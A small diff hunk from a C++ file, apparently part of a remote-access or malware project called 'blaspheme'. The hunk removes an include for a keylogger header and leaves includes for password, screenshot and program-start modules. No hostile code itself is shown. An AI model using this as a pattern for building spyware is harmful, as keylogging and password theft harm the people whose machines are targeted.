@@ -6,7 +6,6 @@
 #include <blaspheme/transfer/FileTransfer.hpp>
 #include <blaspheme/protocol/Authentication.hpp>
 
-#include <malicious/Keylogger.hpp>
 #include <malicious/Passwords.hpp>
 #include <malicious/Screenshot.hpp>
 #include <malicious/ProgramStart.hpp>
